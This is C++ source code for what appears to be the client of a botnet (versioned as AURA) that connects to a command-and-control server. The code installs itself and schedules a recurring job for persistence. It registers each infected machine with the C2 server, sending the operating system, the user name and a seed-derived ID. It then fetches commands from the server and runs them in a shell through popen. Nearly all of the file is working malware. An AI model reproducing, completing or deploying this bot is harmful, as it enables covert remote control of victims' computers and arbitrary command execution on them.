#include <fstream>
#include <memory>
#include <random>
#include <string>

#include "constants.hh"
#include "picosha2.h"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "request.hh"
#include "system.hh"

class C2Server {
   public:
    C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
        _registerUrl = registerUrl;
        _cmdUrl = cmdUrl;
    }

    std::string getRegisterUrl() { return _registerUrl; }
    std::string getCmdUrl() { return _cmdUrl; }

   private:
    std::string _registerUrl, _cmdUrl;
};

class Seed {
   public:
    Seed(const std::string& filePath) { _path = filePath; }
    bool exists();
    void initSeed();
    void getSeed();
    std::string getHash() { return _hash; }

   private:
    std::string _path, _hash;

    void calcHash(const std::string&);
    void calcHash(std::ifstream&);
};

class Command {
   public:
    Command(std::string& c2Response);
    std::string execute();

    std::string commandText;
};

class Bot {
   public:
    Bot(const std::string& seedPath, const std::string& regUrl,
        const std::string& cmdUrl) {
        _hashType = HASH_TYPE;
        _seed = std::make_unique<Seed>(seedPath);
        _c2Server = std::make_unique<C2Server>(regUrl, cmdUrl);
    }

    void init();
    bool isInit();
    void registerBot();
    void executeCommand();

   private:
    std::string _hashType, _hashSum, _os, _user;
    std::unique_ptr<Seed> _seed;
    std::unique_ptr<C2Server> _c2Server;

    void _prepareSysInfo();
};

void Bot::init() {
    // Install files and components
    install::installFiles();
    _seed->initSeed();
    registerBot();
    install::initRecurringJob();
}

bool Bot::isInit() { return _seed->exists(); }

void Bot::registerBot() {
    // Register bot with C2 server
    _prepareSysInfo();
    request::PostForm postForm;
    postForm.addField("version", AURA_VERSION);
    postForm.addField("hash_type", _hashType);
    postForm.addField("hash_sum", _hashSum);
    postForm.addField("operating_sys", _os);
    postForm.addField("user", _user);
    request::post(_c2Server->getRegisterUrl(), postForm.toString());
}

void Bot::executeCommand() {
    // Update system info and create POST form
    _prepareSysInfo();
    request::PostForm postForm;
    postForm.addField("version", AURA_VERSION);
    postForm.addField("hash_sum", _hashSum);

    std::string response =
        request::post(_c2Server->getCmdUrl(), postForm.toString());

    // Parse response and execute based on parameters
    Command cmd(response);
    cmd.execute();
}

void Bot::_prepareSysInfo() {
    // Init or retrieve seed
    if (_seed->exists()) {
        _seed->getSeed();
    } else {
        _seed->initSeed();
    }

    // Retrieve values if they haven't been already
    if (!(_hashSum.size())) {
        _hashSum = _seed->getHash();
    }
    if (!(_os.size())) {
        _os = util::getOS();
    }
    if (!(_user.size())) {
        _user = util::getUser();
    }
}

// Define Seed member functions

bool Seed::exists() {
    std::ifstream inFile(_path);
    return (inFile.good());
}

std::string genSeedData(int rngNumIter) {
    // Use <random> header for portability
    std::string seedData;
    std::random_device randomDev;
    std::mt19937 randNum(randomDev());
    for (int i = 0; i < rngNumIter; ++i) {
        seedData.push_back((char)randNum());
    }

    return seedData;
}

void Seed::initSeed() {
    std::string seedData;
    std::ofstream seedFile(_path, std::ios::binary | std::ios::trunc);
    if (seedFile.is_open()) {
        seedData = genSeedData(SEED_RNG_ITERATIONS);
        seedFile << seedData;
    }

    calcHash(seedData);
}

void Seed::getSeed() {
    if (exists()) {
        std::ifstream seedFile(_path, std::ios::binary);
        if (seedFile.is_open()) calcHash(seedFile);
    }
}

void Seed::calcHash(const std::string& str) {
    _hash = picosha2::hash256_hex_string(str);
}

void Seed::calcHash(std::ifstream& seedFile) {
    // This method may use less memory than getting hex_str from string
    std::vector<unsigned char> hash(32);
    picosha2::hash256(std::istreambuf_iterator<char>(seedFile),
                      std::istreambuf_iterator<char>(), hash.begin(),
                      hash.end());
    _hash = picosha2::bytes_to_hex_string(hash.begin(), hash.end());
}

// Define Command member functions
Command::Command(std::string& c2Response) {
    // Parse into something resembling a nested unordered map
    rapidjson::Document json;
    json.Parse(c2Response.c_str());

    if (json.IsObject())
        commandText = json["command_text"].IsString()
                          ? json["command_text"].GetString()
                          : "";
}

std::string Command::execute() {
    return util::popenSubprocess(commandText.c_str());
}
